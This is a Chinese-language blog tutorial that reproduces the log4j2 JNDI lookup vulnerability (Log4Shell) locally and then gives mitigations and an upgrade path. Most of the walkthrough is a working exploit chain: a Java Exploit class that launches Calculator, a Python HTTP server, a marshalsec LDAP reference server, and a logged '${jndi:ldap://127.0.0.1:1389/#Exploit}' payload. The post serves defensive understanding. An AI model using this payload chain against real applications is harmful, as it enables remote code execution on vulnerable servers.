# lo4j2 漏洞复现过程及解决方案

# 背景

近日，阿里云团队发现并报告了 log4j2 的一个漏洞。

![](https://tva1.sinaimg.cn/large/008i3skNly1gxc86gqz0zj31a60je786.jpg)

由于 log4j2 是一个依赖较广的底层库，所以影响范围很大。影响程度严重，有多严重呢？ 这么说吧，**是灾难性的**。

## 复现漏洞

### 环境介绍

*   操作系统：macos Catalina

*   jdk 版本：11.0.9.1

*   log4j2 版本：2.13.3（使用 springboot 2.3.2.RELEASE 间接依赖）

### 原理介绍

引用公众号：“小林 coding” 的一张图：

![](https://tva1.sinaimg.cn/large/008i3skNly1gxc8bo2wbyj30tm0lmq4k.jpg)

使用 log4j2 正常打日志的时候没事儿，比如：

```java
logger.info("this is {}", "log4j2 demo");
```

但如果你的日志中包含 “`${`” 开头，“`}`” 结尾的内容就会被解析出来，单独处理。

而如果“`${}`” 所包裹的内容是类似这样的：`jndi:ldap://127.0.0.1:1389/#Exploit`，则有可能触发这个漏洞。

复现具体流程是这样的：

1.  先写一段想要被远程执行的 java 代码，然后编译成 class 文件

2.  将 HTTP Server 启动，保证可以通过 Http Server 访问到这个 class 文件。

3.  将 LDAP Server 启动，并将 Http Server 上的那个 class 文件注册上去。

4.  启动 java 应用程序，利用 log4j2 写日志，日志内容包括如 `${jndi:ldap://127.0.0.1:1389/#Exploit}` 这样的内容。

5.  观察结果，看 class 文件中的程序逻辑有没有被执行。

### 复现

```xml
<parent>
       <groupId>org.springframework.boot</groupId>
       <artifactId>spring-boot-starter-parent</artifactId>
       <version>2.3.2.RELEASE</version>
       <relativePath/>
</parent>

...

<dependency>
   <groupId>org.springframework.boot</groupId>
   <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```

可以看到，我是通过 spring-boot-starter-log4j2 来间接引用的 log4j2 的。引入的具体包版本是这样的：

![](https://tva1.sinaimg.cn/large/008i3skNly1gxc99492j7j30dl03f0t0.jpg)

我们先写一段想要被执行的程序：

```java
public class Exploit {

    public Exploit() {
        try {

            System.out.println("执行漏洞代码");
            String[] commands = {"open", "/System/Applications/Calculator.app"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
            System.out.println("完成执行漏洞代码");

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void main(String[] args) {
        Exploit exploit = new Exploit();

    }
}

```

这段程序是打开我电脑上的计算器程序。

**注意：这里的程序不要写 package 包名，我在这里浪费了不少时间，写包名可能会导致后面执行的时候报错。**

然后我们找一个空目录，把 java 文件 copy 过去，接着编译它：

```yaml
javac Exploit.java
```

接着我在当前目录下执行：

```yaml
python -m SimpleHTTPServer 8800
```

目的是启动一个 HTTP Server, 当然你也可以用 nginx 或者 java 程序来做，只要能够充当 HTTP Server 的都可以。

启动后你可以在浏览器里验证一下：

![](https://tva1.sinaimg.cn/large/008i3skNly1gxc9hd6c85j30ak055glp.jpg)

再来我们在本地启动一个 LDAP Server。

[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec "https://github.com/mbechler/marshalsec") 从这里下载代码然后执行打包编译：

```bash
mvn clean package -DskipTests
```

打包后，到 target 目录下执行：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8800/#Exploit"
```

上面命令的目的是启动 LDAP Server，并且把我们的程序注册到 LDAP Server 上。 具体来说是把带有 Http Server 地址（上面用 python 启动的 HTTP server）的 url 注册到 LDAP Server 上。

正常启动后 LDAP 会开始监`1389` 端口

![](https://tva1.sinaimg.cn/large/008i3skNly1gxc9q9urmxj30qe02mdg4.jpg)

最后我们编写记录日志程序：

```java
private static final Logger logger = LogManager.getLogger(Log4jDemo.class);

   public static void main(String[] args) {

       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
       logger.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");

       try {
           Thread.sleep(1000);
       } catch (Exception e) {

       }

   }
```

执行后效果：

![](https://tva1.sinaimg.cn/large/008i3skNly1gxc9s3g296j30w20cndhd.jpg)

可以看到，**我的计算器被调起了。既然可以执行语句和代码逻辑，那么像 \*\*\*\*\*\*\*\* 、**\*\*\*\*\*\* 这种操作也可以执行的！\*\*

上面这段程序中，有一行代码要注意：

```java
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
```

如果设置成 false 或者注释掉这行代码，则计算器都不会被调起，即攻击程序不会被执行。原因是 ：

> Java 最终也修复了这个利用点，对 LDAP Reference 远程工厂类的加载增加了限制，在 Oracle JDK 11.0.1、8u191、7u201、6u211 之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为 false，还对应的分配了一个漏洞编号 CVE-2018-3149

那是不是意味着，高版本的 JDK 就不会有漏洞呢？

不是的，还是有办法攻击，不要抱有侥幸心理，具体可以参考：[https://paper.seebug.org/942/#4-jdk-8u191](https://paper.seebug.org/942/#4-jdk-8u191 "https://paper.seebug.org/942/#4-jdk-8u191")

## 解决方案

### 改配置

网上常说的临时补救方案是修改配置如：

1.  修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true

2.  修改配置 log4j2.formatMsgNoLookups=True

3.  将系统环境变量 FORMAT\_MESSAGES\_PATTERN\_DISABLE\_LOOKUPS 设置为 true

原理其实都一样，就是禁用 log4j2 的 lookup 。

### 升级版本

目前官方 2.15.0 版本已经修复了这个问题，可以升级这个版本，笔者利用上面的程序修改了版本号后，发现漏洞无法再复现了

```xml
<!-- 可以在这里修改 log4j 依赖版本-->
<log4j2.version>2.15.0</log4j2.version>

```

![](https://tva1.sinaimg.cn/large/008i3skNly1gxca49wgq2j30e103f0t1.jpg)

当然你也可以手动编译 log4j2 的源码，然后上传到自己的 maven 私服，再修改公共依赖升级版本。

**注意编译 log4j2 源码时需要 1.9 以上版本的 jdk**，因为它有这么个东西

![](https://tva1.sinaimg.cn/large/008i3skNly1gxca71squwj30be0apgm4.jpg)

## 参考&#x20;

*   [https://paper.seebug.org/942/#4-jdk-8u191](https://paper.seebug.org/942/#4-jdk-8u191 "https://paper.seebug.org/942/#4-jdk-8u191")

*   [https://mp.weixin.qq.com/s/FouhOPacCOMYq153xaw-3A](https://mp.weixin.qq.com/s/FouhOPacCOMYq153xaw-3A "https://mp.weixin.qq.com/s/FouhOPacCOMYq153xaw-3A")
